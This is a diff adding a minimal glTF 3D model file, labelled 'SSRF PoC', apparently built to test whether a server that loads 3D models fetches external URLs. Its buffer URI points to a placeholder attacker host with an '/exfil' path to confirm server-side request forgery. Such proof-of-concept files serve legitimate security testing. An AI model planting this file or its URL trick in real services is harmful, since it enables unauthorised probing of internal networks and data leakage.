@@ -1,0 +1,48 @@
+{
+  "asset": {
+    "generator": "SSRF PoC",
+    "version": "2.0"
+  },
+  "buffers": [
+    {
+      "uri": "https://YOUR_SERVER.com/exfil?data=ssrf_confirmed",
+      "byteLength": 100
+    }
+  ],
+  "bufferViews": [
+    {
+      "buffer": 0,
+      "byteLength": 100
+    }
+  ],
+  "accessors": [
+    {
+      "bufferView": 0,
+      "componentType": 5126,
+      "count": 1,
+      "type": "VEC3"
+    }
+  ],
+  "meshes": [
+    {
+      "primitives": [
+        {
+          "attributes": {
+            "POSITION": 0
+          }
+        }
+      ]
+    }
+  ],
+  "nodes": [
+    {
+      "mesh": 0
+    }
+  ],
+  "scene": 0,
+  "scenes": [
+    {
+      "nodes": [0]
+    }
+  ]
+}
